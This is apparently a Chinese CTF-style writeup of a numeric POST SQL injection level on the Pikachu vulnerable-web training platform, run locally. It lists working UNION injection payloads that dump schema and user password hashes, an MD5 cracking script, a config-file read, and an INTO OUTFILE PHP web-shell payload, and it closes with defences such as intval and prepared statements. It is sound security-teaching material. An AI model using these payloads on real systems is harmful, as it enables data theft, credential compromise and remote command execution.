---
layout: post
title: Pikachu - SQL注入 数字型注入(post) Writeup（完整注入链）
platform: pikachu
date: 2026-10-27 22:12:00 +0800
categories: CTF
---

Pikachu - SQL注入 数字型注入(post) Writeup（完整注入链）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：SQL-Inject → 数字型注入(post)
- 地址：`http://localhost/pikachu/vul/sqli/sqli_id.php`
- 题型：Web
- 考点：**数字型 SQL 注入**、UNION 联合查询、information_schema 元数据

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
数据库：pikachu / root / root
```

**页面形态**：

```text
select your userid?

[ 下拉框 --- v ]  [ 查询 ]

hello,vince
your email is: vince@pikachu.com
```

**作者提示**：

```html
data-content="变量类型为数字"
```

**✅ 实测结果（完整注入链）**

| # | payload | 结果 |
|---|---|---|
| 1 | `id=1` | 1 条：vince |
| 2 | `id=999` | 0 条（不存在）|
| 3 | **`id=1 or 1=1`** | **7 条（全部用户）** |
| 4 | **`id=-1 union select 1,2`** | **`1` \| `2`（探出 2 列）** |
| 5 | `id=-1 union select database(),2` | **`pikachu`** |
| 6 | `id=-1 union select version(),2` | `5.7.26` |
| 7 | `id=-1 union select user(),2` | **`root@localhost`** |
| 8 | `... group_concat(table_name) ... information_schema.tables` | **`httpinfo \| member \| message \| users \| xssblind`** |
| 9 | `... group_concat(column_name) ... columns where table_name='member'` | `id,username,pw,sex,phonenum,address,email` |
| 10 | `... group_concat(concat(username,':',password)) from users` | **`admin:e10adc39... \| pikachu:670b1472... \| test:e99a18c4...`** |

**哈希破解结果**：

| 用户 | MD5 | 明文 |
|---|---|---|
| admin | `e10adc3949ba59abbe56e057f20f883e` | **123456** |
| pikachu | `670b14728ad9902aecba32e22fa4f6bd` | **000000** |
| test | `e99a18c428cb38d5f260853678922e03` | **abc123** |

**★ 从"一个下拉框"到"全库账号密码明文"，只用了 10 步。**

二、题目分析

**① 后端代码（一行就是漏洞）**

```php
<?php
// sqli_id.php 第 24-39 行
if(isset($_POST['submit']) && $_POST['id'] != null){
    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入
    $id = $_POST['id'];                                          // ★ 零处理

    $query = "select username,email from member where id=$id";   // ★ 直接拼接
    $result = execute($link, $query);

    if(mysqli_num_rows($result) >= 1){
        while($data = mysqli_fetch_assoc($result)){
            $username = $data['username'];
            $email    = $data['email'];
            $html .= "<p class='notice'>hello,{$username} <br />your email is: {$email}</p>";
        }
    }else{
        $html .= "<p class='notice'>您输入的user id不存在，请重新输入！</p>";
    }
}
?>
```

**★ 三个关键点**：

```
① 参数：POST 的 id
② SQL 里是 id=$id —— 没有引号 → 数字型注入
③ 没有任何过滤（没有 intval、没有转义、没有预处理）
```

**② 数字型 vs 字符型：最关键的区别**

**数字型（本关）**：

```sql
select username,email from member where id=$id
                                           └┬┘
                                     直接是数字形式
```

**★ 注入时不需要闭合任何引号**：

```sql
id=1 or 1=1
→ select ... where id=1 or 1=1
                       └──┬──┘
                    直接接上，逻辑成立
```

**字符型（下一关）**：

```sql
select username,email from member where username='$name'
                                                └─┬──┘
                                          有单引号包裹
```

**★ 必须先闭合单引号**：

```sql
name=' or '1'='1
→ select ... where username='' or '1'='1'
                              └──┬──┘
                         闭合了字符串
```

**★ 两种类型的 payload 形态完全不同**：

| 类型 | 正常输入 | 注入 payload |
|---|---|---|
| **数字型** | `1` | `1 or 1=1` |
| **字符型** | `vince` | `vince' or '1'='1` |

**③ ⚠️ 这一关的"坑"：表单是下拉框**

```html
<form method="post">
    <select name="id">
        <option value="">---</option>
        <option value="1">1</option>
        <option value="2">2</option>
        <option value="3">3</option>
        <option value="4">4</option>
        <option value="5">5</option>
    </select>
    <input type="submit" name="submit" value="查询" />
</form>
```

**★ 下拉框只允许选 1~5，你没法直接输入 `1 or 1=1`。**

**★ 所以必须"改包"** —— 而**改包是 SQL 注入的基本功**。

**④ 三种改包方式**

**方式 1：控制台改 DOM（最快）**

```javascript
document.querySelector('select').innerHTML='<option value="1 or 1=1">X</option>'
```

**★ 一行代码把下拉框替换成只有一个选项，value 就是 payload。**

**方式 2：F12 元素面板改 option**

```text
① 元素面板 Ctrl+F 搜 "select name"
② 双击 <option value="1">1</option> 里的 value
③ 改成 value="1 or 1=1"
④ 网页上选那个选项 → 点查询
```

**方式 3：编辑并重发 / Burp**

```text
① 网络面板抓 POST
② 右键 → 编辑并重发
③ 把 id=1 改成 id=1 or 1=1
④ 发送
```

**★ 三种方式本质一样：修改"实际提交的值"，绕开前端限制。**

**★ 老规律**：

```
前端限制（maxlength / disabled / 下拉框 / 正则校验）
→ 全部可以通过"改请求"绕过
→ 服务器只认"请求里实际带的值"
```

三、解题步骤

**第 1 步：建立基准（正常查询）**

```text
① 打开 http://localhost/pikachu/vul/sqli/sqli_id.php
② 下拉框选 "1" → 点查询
③ 看到：
     hello,vince
     your email is: vince@pikachu.com
```

**★ 说明 id=1 对应 vince。**

**第 2 步：判断注入类型（数字型）**

**方式**：试 `1 or 1=1`

```text
① F12 → 控制台
② 粘贴：
   document.querySelector('select').innerHTML='<option value="1 or 1=1">X</option>'
③ 回车
④ 点网页上的【查询】
```

**结果**：

```text
hello,vince   your email is: vince@pikachu.com
hello,allen   your email is: allen@pikachu.com
hello,kobe    your email is: kobe@pikachu.com
hello,grady   your email is: grady@pikachu.com
hello,kevin   your email is: kevin@pikachu.com
hello,lucy    your email is: lucy@pikachu.com
hello,lili    your email is: lili@pikachu.com
```

**★ 7 个用户全部返回 → 注入成立。**

**★ 为什么？**

```sql
select username,email from member where id=1 or 1=1
                                              └──┬──┘
                                        恒为真 → 返回全表
```

**第 3 步：探测列数（UNION 注入的前提）**

**UNION 的规则**：前后两个 SELECT 的列数必须相同。

**payload**：

```text
-1 union select 1,2
```

**控制台**：

```javascript
document.querySelector('select').innerHTML='<option value="-1 union select 1,2">X</option>'
```

**结果**：

```text
hello,1
your email is: 2
```

**★ 说明**：

```
① 原查询是 2 列（username, email）
② union 后面也写 2 列 → 不报错
③ 页面显示 1 和 2 → 说明第 1 列和第 2 列都能"回显"
```

**★ 为什么用 `-1` 而不是 `1`？**

```sql
-- 用 1：
select username,email from member where id=1 union select 1,2
→ 显示 vince 那行 + 1/2 那行（两条混在一起）

-- 用 -1：
select username,email from member where id=-1 union select 1,2
→ id=-1 查不到任何行 → 只显示 union 的结果
```

**★ `-1` 的作用：让第一条查询"空"，只显示我们注入的数据。**

**★ 如果列数写错会怎样？**

```sql
-1 union select 1
→ ERROR 1222: The used SELECT statements have a different number of columns
```

**★ 页面会报 SQL 错误 —— 这本身就是"探列数"的依据（递增试 1、2、3... 直到不报错）。**

**第 4 步：读库名、版本、用户**

**payload 1：库名**

```text
-1 union select database(),2
```

**结果**：

```text
hello,pikachu
```

**payload 2：数据库版本**

```text
-1 union select version(),2
```

**结果**：

```text
hello,5.7.26
```

**payload 3：当前数据库用户**

```text
-1 union select user(),2
```

**结果**：

```text
hello,root@localhost
```

**★ 这一步很重要**：

```
数据库用户是 root
→ 可能有 FILE 权限 → 能读文件（load_file）甚至写文件（INTO OUTFILE）
→ 如果目标是 Windows + 有写权限 → 可能直接 getshell
```

**第 5 步：读表名（information_schema）**

**MySQL 5.0+ 有内置的 `information_schema` 库，存着所有元数据**：

```sql
-- 所有表
select table_name from information_schema.tables where table_schema=database()

-- 所有列
select column_name from information_schema.columns where table_name='xxx'
```

**payload**：

```text
-1 union select group_concat(table_name separator ' | '),2
   from information_schema.tables where table_schema=database()
```

**结果**：

```text
hello,httpinfo | member | message | users | xssblind
```

**★ 拿到了 pikachu 库的 5 张表**：

| 表名 | 用途 |
|---|---|
| `member` | CSRF 模块的会员表 |
| `users` | 登录表（admin/pikachu/test）|
| `message` | 存储型 XSS 的留言板 |
| `xssblind` | 盲打的反馈表 |
| `httpinfo` | HTTP header 注入的记录表 |

**★ `group_concat()` 的作用**：

```
把多行结果拼成一行（默认用逗号分隔）
→ 否则一页只能显示一条表名，要点很多次

语法：group_concat(字段 separator ' | ')
```

**第 6 步：读列名**

**payload**：

```text
-1 union select group_concat(column_name),2
   from information_schema.columns
   where table_name='member' and table_schema=database()
```

**结果**：

```text
hello,id,username,pw,sex,phonenum,address,email
```

**★ `member` 表的 7 个字段全拿到了。**

**★ 注意 `pw` 这个字段名**：

```
不是 password，是 pw
★ 如果猜字段名，很容易猜错
★ 所以"从 information_schema 读"比"瞎猜"靠谱 100 倍
```

**第 7 步：拖库（拿到账号密码）**

**先看 `users` 表的结构**：

```text
-1 union select group_concat(concat(column_name,':',data_type)),2
   from information_schema.columns
   where table_name='users' and table_schema=database()
```

**结果**：

```text
hello,id:int,username:varchar,password:varchar,level:int
```

**然后直接拖数据**：

```text
-1 union select group_concat(concat(username,':',password) separator ' | '),2
   from users
```

**结果**：

```text
hello,admin:e10adc3949ba59abbe56e057f20f883e |
      pikachu:670b14728ad9902aecba32e22fa4f6bd |
      test:e99a18c428cb38d5f260853678922e03
```

**★ 三个账号 + 密码的 MD5 哈希全拿到了。**

**第 8 步：破解哈希**

**`e10adc3949ba59abbe56e057f20f883e` 是 MD5("123456") —— 一个知名弱口令。**

**用脚本碰撞**：

```python
import hashlib

hashes = {
    "admin":   "e10adc3949ba59abbe56e057f20f883e",
    "pikachu": "670b14728ad9902aecba32e22fa4f6bd",
    "test":    "e99a18c428cb38d5f260853678922e03",
}
cands = ["123456","000000","abc123","111111","password","admin","qwerty"]

for user, h in hashes.items():
    for c in cands:
        if hashlib.md5(c.encode()).hexdigest() == h:
            print("%s → %s" % (user, c))
            break
```

**输出**：

```text
admin   → 123456
pikachu → 000000
test    → abc123
```

**★ 全部明文到手。**

**★ 真实场景可以**：

```
· 用 john / hashcat 跑字典
· 用在线彩虹表（cmd5、somd5 等）
· 撞库（同样的密码试其他系统）
```

**第 9 步：完整攻击链总结**

```text
一个下拉框
    ↓  id=1 or 1=1                      （判断有没有注入）
7 个用户
    ↓  union select 1,2                  （探列数）
2 列回显
    ↓  union select database(),user()    （读库名、用户）
pikachu / root
    ↓  information_schema.tables         （读表名）
5 张表
    ↓  information_schema.columns        （读列名）
member 的 7 个字段
    ↓  group_concat(concat(...)) from users   （拖数据）
3 个账号 + MD5 哈希
    ↓  弱口令碰撞
3 个明文密码

★ 从"输入一个数字"到"拿到所有账号密码"，10 步
```

四、延伸知识

**① 数字型注入的完整方法论（通用流程）**

```text
第 1 步：判断有没有注入
    1 and 1=1     → 正常返回
    1 and 1=2     → 返回空
    ★ 两者不同 = 有注入

第 2 步：判断列数
    order by N        （N 递增，直到报错）
    union select 1,2,3... （直到不报错）
    
第 3 步：找"回显位"
    -1 union select 1,2,3
    ★ 页面上显示哪几个数字，哪几列就能用来回显数据

第 4 步：读基本信息
    database()   库名
    version()    版本
    user()       数据库用户
    @@datadir    数据目录

第 5 步：读元数据
    information_schema.tables    所有表
    information_schema.columns   所有列

第 6 步：拖数据
    select 目标字段 from 目标表
```

**② `order by` 探列数（另一种常用方法）**

```sql
1 order by 1        → 正常
1 order by 2        → 正常
1 order by 3        → 报错：Unknown column '3' in 'order clause'
→ 说明只有 2 列
```

**★ 比 union 更简单（不用构造完整 SELECT）。**

**③ 为什么 `union` 前后列数必须相同**

```sql
-- 正确
select a,b from t1 union select c,d from t2     -- 都是 2 列

-- 报错
select a,b from t1 union select c from t2       -- 2 列 vs 1 列
-- ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

**★ 这个报错本身就是"探列数"的信号。**

**④ 数字型注入的防御（正确做法）**

**❌ 错误做法 1：加引号**

```php
$query = "select ... where id='$id'";     // 变成字符型，但仍可注入
```

**❌ 错误做法 2：只用 `addslashes`**

```php
$id = addslashes($_POST['id']);
$query = "select ... where id=$id";
// addslashes 只转义引号，数字型注入里没有引号 → 完全无效
```

**❌ 错误做法 3：`is_numeric` 但后面又拼回去**

```php
if (!is_numeric($id)) die("非法");
$query = "select ... where id=$id";       // 这个其实还行（is_numeric 挡住了）
// 但 is_numeric("1e3") = true，is_numeric(" 1") = true，有边界问题
```

**✅ 正确做法 1：强制转整数**

```php
$id = intval($_POST['id']);               // "1 or 1=1" → 1
$query = "select ... where id=$id";
```

**★ `intval` 是最简单有效的方案**：

```
intval("1 or 1=1")  → 1
intval("1 union ...") → 1
intval("abc")       → 0

★ 非数字开头的直接变 0，数字开头的只保留数字部分
```

**✅ 正确做法 2：预处理语句（最规范）**

```php
$stmt = $link->prepare("select username,email from member where id=?");
$stmt->bind_param('i', $id);              // 'i' = integer
$stmt->execute();
$result = $stmt->get_result();
```

**★ 预处理的原理**：

```
SQL 语句的"结构"先发给数据库
参数"值"后发
→ 数据库永远不会把"值"当"语句"解析
→ 注入从根本上不可能

★ 这是防 SQL 注入的"银弹"
```

**⑤ 预处理 vs 转义：完整对比**

| 方案 | 效果 | 推荐度 |
|---|---|---|
| `intval()`（数字参数）| ✅ 完全有效 | ✅✅ 简单场景首选 |
| `mysqli_real_escape_string` | ✅ 有效（字符型）| ⚠️ 容易漏（数字型无效、编码问题）|
| **预处理（prepare/bind）** | ✅✅ **根本解决** | ✅✅✅ **最佳实践** |
| 白名单/正则 | ✅ 有效（但限制用户）| ✅ 辅助 |
| WAF | ⚠️ 能绕 | ❌ 不能只靠它 |

**⑥ 拿到 root 权限后能做什么（进阶）**

**如果 MySQL 用户是 root 且有 FILE 权限**：

**读文件**：

```sql
-1 union select load_file('D:\\phpstudy_pro\\WWW\\pikachu\\inc\\config.inc.php'),2
```

**★ 能直接读出数据库配置（用户名、密码）。**

**写文件（getshell）**：

```sql
-1 union select '<?php system($_GET[cmd]); ?>',2
   into outfile 'D:\\phpstudy_pro\\WWW\\pikachu\\shell.php'
```

**★ 前提**：

```
① MySQL 的 secure_file_priv 允许（空 或 指定目录）
② 数据库用户有 FILE 权限
③ 目标目录可写
④ 知道绝对路径
```

**★ 本关的环境**：

```sql
show variables like 'secure_file_priv';
-- 如果是 NULL → 禁止导入导出
-- 如果是 空 → 任何目录都可以
-- 如果是 具体路径 → 只能那个目录
```

**★ 现代 MySQL 默认 `secure_file_priv = NULL` → 不能写文件。**

**⑦ SQL 注入的完整分类（这个模块后面要做的）**

| 类型 | 特点 | 本模块关卡 |
|---|---|---|
| **数字型** | 参数是数字，无引号 | **本关** |
| 字符型 | 参数有引号包裹 | 字符型注入(get) |
| 搜索型 | `like '%$x%'` | 搜索型注入 |
| XX 型 | `('$x')` 括号包裹 | xx型注入 |
| **报错注入** | 用报错信息回显数据 | — |
| **布尔盲注** | 页面只有"对/错"两种状态 | 盲注(base on boolean) |
| **时间盲注** | 用 `sleep()` 判断真假 | 盲注(base on time) |
| **堆叠注入** | 一次执行多条语句 | insert/update/delete |
| **宽字节注入** | GBK 编码绕过转义 | 宽字节注入 |
| **HTTP 头注入** | 注入点在 User-Agent / Referer | http header 注入 |

**★ 本关是"最简单的一类"，后面会越来越难。**

五、总结

- **本题核心：`$_POST['id']` 被直接拼进 SQL（数字型，无引号、无过滤）→ 可注入。**

- **一行漏洞代码**：

```php
$query = "select username,email from member where id=$id";
```

- **⭐ 五个必记要点**：

```text
① 数字型 vs 字符型
   数字型：where id=$id       → 1 or 1=1
   字符型：where name='$n'    → ' or '1'='1

② 下拉框/前端限制都能绕
   改 DOM / 编辑并重发 / Burp
   → 服务器只认"请求里实际带的值"

③ UNION 注入的前提是"列数相同"
   order by N 或 union select 1,2,3... 探测
   ★ 用 -1 让第一行查不到，只显示注入结果

④ information_schema 是"元数据库"
   tables / columns 两张表几乎能拿到所有结构信息
   ★ 比猜字段名靠谱 100 倍

⑤ root 权限很危险
   → FILE 权限可读文件（load_file）
   → 若目录可写 + secure_file_priv 允许 → 可 getshell
```

- **实测数据（完整链）**：

```text
id=1                          → vince
id=1 or 1=1                   → 7 条（全表）
id=-1 union select 1,2        → 1 | 2（2 列）
id=-1 union select database() → pikachu
id=-1 union select version()  → 5.7.26
id=-1 union select user()     → root@localhost

information_schema.tables     → httpinfo | member | message | users | xssblind
member 的列                    → id,username,pw,sex,phonenum,address,email
users 的列                     → id:int,username:varchar,password:varchar,level:int

users 数据（group_concat）：
    admin:e10adc3949ba59abbe56e057f20f883e      → 123456
    pikachu:670b14728ad9902aecba32e22fa4f6bd    → 000000
    test:e99a18c428cb38d5f260853678922e03       → abc123
```

- **改包的三种方式（这关必须用）**：

```javascript
// 方式 1：控制台（最快）
document.querySelector('select').innerHTML='<option value="1 or 1=1">X</option>'
```

```text
方式 2：F12 元素面板改 option 的 value
方式 3：F12 网络 → 编辑并重发 → 改 id 参数
```

- **SQL-Inject 模块进度**：

```text
✅ 数字型注入(post)      —— 本题：无引号、无过滤
⬜ 字符型注入(get)       —— 需要闭合单引号
⬜ 搜索型注入            —— like 模糊查询
⬜ xx型注入              —— 括号包裹
⬜ "insert/update"注入   —— 写操作注入
⬜ "delete"注入          —— 删除操作注入
⬜ "http header"注入     —— User-Agent / Referer
⬜ 盲注(base on boolean) —— 只有真假两种状态
⬜ 盲注(base on time)    —— 用 sleep 判断
⬜ 宽字节注入            —— GBK 编码绕过
```

**手工复现要点**：

```text
· 打开 sqli_id.php，选 id=1 → 看 vince
· F12 控制台：document.querySelector('select').innerHTML='<option value="1 or 1=1">X</option>'
· 点查询 → 看到 7 个用户
· 换 -1 union select 1,2 → 探出 2 列
· 换 -1 union select database(),user() → pikachu / root@localhost
· 换 information_schema 查询 → 读表名、列名
· 换 group_concat 拖 users 表 → 拿到账号 + MD5
· 用 md5 碰撞 → 明文
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  数字型注入 = 直接往 SQL 里塞 OR 条件                          │
│                                                            │
│  三步走：                                                   │
│     ① 判断：1 and 1=1 vs 1 and 1=2                          │
│     ② 探列：order by N / union select 1,2,3                 │
│     ③ 拖库：information_schema → 表名 → 列名 → 数据          │
│                                                            │
│  ★ 前端下拉框不是防护，改包就行                                │
│  ★ 数字型用 intval() 就能彻底防住                             │
│  ★ 字符型要用预处理（prepare/bind_param）                     │
└────────────────────────────────────────────────────────────┘
```
